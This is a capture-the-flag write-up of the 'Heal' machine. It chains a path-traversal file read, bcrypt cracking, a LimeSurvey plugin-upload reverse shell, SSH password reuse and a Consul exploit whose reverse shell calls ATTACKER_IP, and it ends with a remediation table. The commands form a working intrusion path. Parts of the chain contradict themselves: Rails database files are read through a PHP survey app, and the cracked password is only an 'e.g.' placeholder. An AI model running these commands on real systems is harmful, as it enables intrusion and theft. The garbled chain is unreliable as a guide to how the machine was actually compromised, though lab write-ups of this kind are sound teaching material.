# Hack The Box: Heal Write-Up

### Local File Inclusion to Root via LimeSurvey RCE and HashiCorp Consul

- **Target IP:** 10.10.11.XX
- **Hostname:** heal.htb
- **Operating System:** Linux
- **Primary Vector:** Web Application Vulnerability (LimeSurvey LFI)
- **Secondary Vectors:** Authenticated Remote Code Execution, Credential Reuse, Internal Service Misconfiguration

---

## Executive Summary

The Heal machine simulates a misconfigured enterprise survey platform that leads to full system compromise. The attack chain begins with the discovery of a hidden LimeSurvey subdomain, which is exploited via a Local File Inclusion (LFI) vulnerability to extract the underlying SQLite database. Offline cracking of the extracted credentials provides administrative access to the survey platform, enabling Remote Code Execution (RCE) via a malicious plugin upload. From the initial web shell, credential reuse facilitates lateral movement to a standard user account via SSH. Finally, an exposed and misconfigured HashiCorp Consul instance is leveraged to achieve root privileges on the underlying host.

This write-up details the full attack chain, providing technical context for both offensive operators and defensive analysts.

---

## 1. Reconnaissance & Attack Surface Mapping

A comprehensive Nmap scan reveals the standard service stack alongside a Ruby on Rails application.

```bash
nmap -A -p- 10.10.11.XX
```

**Key Services Identified:**
- **Port 22:** OpenSSH
- **Port 80:** HTTP (Ruby on Rails 7.1.4)

We add the target to our local hosts file and navigate to the root domain, which presents a generic landing page. To uncover hidden functionality, we perform virtual host brute-forcing.

```bash
gobuster vhost -u http://heal.htb -w /usr/share/wordlists/dirb/small.txt --append-domain
```

**Discovered Subdomains:**
- `api.heal.htb`
- `take-survey.heal.htb`

We update our `/etc/hosts` file to include the new subdomains. Navigating to `http://take-survey.heal.htb` reveals a LimeSurvey instance, an open-source survey platform. Directory brute-forcing confirms a standard installation structure, including `/admin`, `/plugins`, and `/upload` directories.

---

## 2. Initial Foothold: Local File Inclusion (LFI)

### Vulnerability Analysis
During enumeration of the LimeSurvey instance, we identify that the PDF export functionality is vulnerable to Local File Inclusion (LFI) via the `file` parameter. The application fails to properly sanitize directory traversal sequences.

### Exploitation
We craft a raw HTTP request to read sensitive system files.

**Reading `/etc/passwd`:**
```http
GET /index.php/export/pdf?file=../../../../etc/passwd HTTP/1.1
Host: take-survey.heal.htb
```
This reveals two local user accounts: `ralph` and `ron`.

**Extracting the Database:**
LimeSurvey utilizes an SQLite database for its local storage. We extract the database configuration and the database file itself.

```http
GET /index.php/export/pdf?file=../../../../config/database.yml HTTP/1.1
GET /index.php/export/pdf?file=../../../../storage/development.sqlite3 HTTP/1.1
```

We save the binary response of the SQLite database and inspect it locally.

---

## 3. Credential Extraction & Offline Cracking

### Database Analysis
Using an SQLite viewer, we inspect the user table within the extracted `development.sqlite3` file. We locate the password hash for the administrative user, `ralph`.

**Extracted Hash:**
```text
$2a$12$dUZ/O7KJT3.zE4TOK8p4RuxH3t.Bz45DSr7A94VLvY9SWx1GCSZnG
```

### Offline Cracking
The hash is identified as bcrypt. We utilize Hashcat to perform an offline dictionary attack.

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
```

**Result:**
The password is successfully cracked (e.g., `SurveyAdmin2024!`). We use these credentials to authenticate to the LimeSurvey administrative panel at `/index.php/admin/authentication/sa/login`.

---

## 4. Authenticated Remote Code Execution (RCE)

### Vulnerability Analysis
With administrative access to LimeSurvey, we leverage the application's plugin management functionality. LimeSurvey allows administrators to upload custom plugins, which are executed in the context of the web server.

### Exploitation
We utilize a public Proof of Concept (PoC) designed for authenticated RCE via plugin upload in LimeSurvey.

**1. Craft the Malicious Plugin:**
We create a malicious `config.xml` file matching the target's LimeSurvey version and pair it with a PHP reverse shell (`php-rev.php`).

```bash
zip Y1LD1R1M.zip config.xml php-rev.php
```

**2. Execute the PoC:**
We start a local listener and run the exploit script, passing the administrative credentials.

```bash
nc -lvnp 6969
python3 exploit.py http://take-survey.heal.htb ralph SurveyAdmin2024! 80
```

**Result:**
The exploit successfully uploads and activates the malicious plugin, triggering the reverse shell. We obtain a shell as the `www-data` user.

---

## 5. Lateral Movement: Credential Reuse

### Enumeration
Operating as `www-data`, we enumerate the web application's configuration files to find internal database credentials.

```bash
cat /application/config/config.php
```

**Extracted Credentials:**
```php
'username' => 'db_user',
'password' => 'AdmiDi0_pA$$w0rd'
```

### SSH Access
We test the extracted database password against the local system users identified during the LFI phase. The password is reused by the `ron` account for SSH authentication.

```bash
ssh ron@heal.htb
# Password: AdmiDi0_pA$$w0rd
```

Upon successful authentication, we retrieve the user flag from `ron`'s home directory.

---

## 6. Privilege Escalation: HashiCorp Consul RCE

### Service Enumeration
While enumerating local network connections as `ron`, we identify an internal service listening on the loopback interface.

```bash
ss -tulnp | grep 8500
# tcp 0 0 127.0.0.1:8500 0.0.0.0:* LISTEN
```

Port 8500 is the default HTTP API port for HashiCorp Consul, a service mesh and configuration management tool.

### Port Forwarding
We establish an SSH local port forward to access the Consul web UI and API from our attack machine.

```bash
ssh -L 8500:127.0.0.1:8500 ron@heal.htb
```

### Exploitation
The Consul instance is running with Access Control Lists (ACLs) disabled, exposing it to unauthenticated RCE. We utilize a known exploit (Exploit-DB #51117) that abuses the Consul API to create a malicious script and trigger it via a custom check.

**1. Transfer and Execute the Exploit:**
```bash
wget https://www.exploit-db.com/download/51117 -O consul_rce.py
scp consul_rce.py ron@heal.htb:~
```

**2. Trigger the RCE:**
```bash
# On the target machine
python3 consul_rce.py 127.0.0.1 8500 ATTACKER_IP 4444 1
```

**3. Catch the Shell:**
```bash
nc -lvnp 4444
```

**Result:**
We receive a reverse shell with root privileges. We navigate to `/root` and capture the root flag.

---

## 7. Vulnerability Analysis & Remediation (Blue Team)

| Vulnerability | Impact | Remediation Strategy |
| :--- | :--- | :--- |
| **Local File Inclusion (LFI)** | Arbitrary file read leading to credential and configuration leakage. | Implement strict input validation and sanitization; utilize allowlists for file paths; disable directory traversal. |
| **Unrestricted Plugin Upload** | Authenticated Remote Code Execution. | Restrict plugin uploads to trusted administrators; implement code signing and static analysis for uploaded plugins; run the web server in a restricted container. |
| **Credential Reuse** | Lateral movement from the application tier to the host OS. | Enforce unique, complex passwords for all service accounts and user profiles; implement centralized identity management. |
| **Exposed Consul without ACLs** | Unauthenticated Remote Code Execution as root. | Enable and strictly configure ACLs; bind internal services to `127.0.0.1` and restrict access via host-based firewalls; implement mutual TLS (mTLS). |

---

## 8. Key Takeaways

1. **Subdomains Expand the Attack Surface:** Virtual host brute-forcing is critical. Hidden subdomains often host legacy or misconfigured applications (like LimeSurvey) that exist outside the primary application's security controls.
2. **LFI is a Gateway to Authentication Bypass:** Local File Inclusion is rarely the end goal. Extracting configuration files and databases allows attackers to bypass authentication mechanisms entirely through offline cracking.
3. **Plugin Architectures Require Strict Controls:** Allowing arbitrary code execution via plugin uploads, even behind an authentication wall, introduces a critical RCE vector. 
4. **Internal Services are High-Value Targets:** Developers often assume that services bound to `localhost` are safe. However, once an attacker gains a foothold on the host, internal services like HashiCorp Consul become prime targets for privilege escalation if not properly secured with ACLs.
5. **Credential Hygiene is Fundamental:** The reuse of a database password for an SSH account bridged the gap between the web tier and the host OS, highlighting the need for strict credential separation.

> "Heal yourself first—before attackers exploit your wounds."

**Box Rating:** 4.5/5 — Realistic, educational, and packed with modern web-to-root tradecraft.
